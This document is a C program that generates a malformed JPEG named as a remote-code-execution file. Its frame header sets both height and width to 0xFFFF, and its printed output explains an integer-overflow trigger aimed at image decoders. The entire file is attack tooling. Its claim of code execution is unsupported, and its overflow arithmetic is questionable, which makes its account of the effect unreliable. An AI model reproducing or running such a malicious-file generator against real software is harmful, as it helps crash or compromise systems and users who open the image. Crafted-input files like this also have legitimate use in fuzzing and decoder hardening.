#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

void write_be16(FILE *f, uint16_t val) {
    fputc((val >> 8) & 0xFF, f);
    fputc(val & 0xFF, f);
}

int main() {
    FILE *fp = fopen("/home/result/overflow_rce.jpg", "wb");
    if (!fp) {
        perror("Failed to open output file");
        return 1;
    }

    printf("[*] Generating overflow JPEG...\n");

    // SOI - Start of Image (FFD8)
    write_be16(fp, 0xFFD8);
    printf("[+] SOI marker written\n");

    // APP0 - JFIF Header
    write_be16(fp, 0xFFE0);  // APP0 marker
    write_be16(fp, 16);       // Length
    fwrite("JFIF\x00", 1, 5, fp);
    fputc(0x01, fp);  // Major version
    fputc(0x01, fp);  // Minor version
    fputc(0x00, fp);  // Units (no units)
    write_be16(fp, 1);        // X density
    write_be16(fp, 1);        // Y density
    fputc(0x00, fp);  // Thumbnail width
    fputc(0x00, fp);  // Thumbnail height
    printf("[+] APP0 (JFIF) marker written\n");

    // DQT - Define Quantization Table
    write_be16(fp, 0xFFDB);  // DQT marker
    write_be16(fp, 67);      // Length (64 bytes table + 3 bytes header)
    fputc(0x00, fp);  // Precision and table class
    for (int i = 0; i < 64; i++) {
        fputc(16, fp);  // Simple quantization values
    }
    printf("[+] DQT marker written\n");

    // SOF0 - Start of Frame (0xFFC0 - CRITICAL: Overflow dimensions here)
    write_be16(fp, 0xFFC0);  // SOF0 marker
    write_be16(fp, 17);      // Length: 8 + 3*components = 17
    fputc(0x08, fp);         // Precision (8 bits per sample)

    // HEIGHT = 0xFFFF (65535) - OVERFLOW!
    write_be16(fp, 0xFFFF);
    printf("[+] Height: 0xFFFF (65535) - OVERFLOW TRIGGER\n");

    // WIDTH = 0xFFFF (65535) - OVERFLOW!
    write_be16(fp, 0xFFFF);
    printf("[+] Width: 0xFFFF (65535) - OVERFLOW TRIGGER\n");

    // COMPONENTS = 3 (RGB)
    fputc(0x03, fp);
    printf("[+] Components: 3 (RGB)\n");

    // Component definitions (3 components)
    for (int i = 0; i < 3; i++) {
        fputc(i + 1, fp);      // Component ID (1, 2, 3)
        fputc(0x11, fp);       // Sampling factors
        fputc(i, fp);          // Quantization table selection
    }

    printf("[+] SOF marker written with OVERFLOW DIMENSIONS\n");
    printf("\n[!] Integer Overflow Calculation:\n");
    printf("    width × height × components = 0xFFFF × 0xFFFF × 3\n");
    uint64_t overflow_calc = (uint64_t)0xFFFF * 0xFFFF * 3;
    printf("    = %llu bytes (0x%llx)\n", overflow_calc, overflow_calc);
    uint32_t result_32bit = (uint32_t)overflow_calc;
    printf("    32-bit result: 0x%08x\n", result_32bit);
    printf("    Allocate: %u bytes, Write: %llu bytes -> OVERFLOW\n", result_32bit, overflow_calc);

    // DHT - Define Huffman Table
    write_be16(fp, 0xFFC4);  // DHT marker
    write_be16(fp, 19);      // Length
    fputc(0x00, fp);         // Table info
    for (int i = 0; i < 16; i++) {
        fputc(0x00, fp);
    }
    printf("[+] DHT marker written\n");

    // SOS - Start of Scan
    write_be16(fp, 0xFFDA);  // SOS marker
    write_be16(fp, 12);      // Length
    fputc(0x03, fp);         // Number of components
    for (int i = 0; i < 3; i++) {
        fputc(i + 1, fp);    // Component ID
        fputc(0x00, fp);     // Huffman table selection
    }
    fputc(0x00, fp);  // Spectral selection start
    fputc(0x3F, fp);  // Spectral selection end
    fputc(0x00, fp);  // Successive approximation
    printf("[+] SOS marker written\n");

    // Minimal scan data
    fwrite("\xFF\x00", 1, 2, fp);
    for (int i = 0; i < 50; i++) {
        fputc(0xFF, fp);
    }

    // EOI - End of Image
    write_be16(fp, 0xFFD9);
    printf("[+] EOI marker written\n");

    fclose(fp);

    printf("\n[✓] Overflow JPEG generated: /home/result/overflow_rce.jpg\n");

    // Verify
    FILE *check = fopen("/home/result/overflow_rce.jpg", "rb");
    if (check) {
        fseek(check, 0, SEEK_END);
        long size = ftell(check);
        printf("[+] File size: %ld bytes\n", size);
        fclose(check);
    }

    return 0;
}
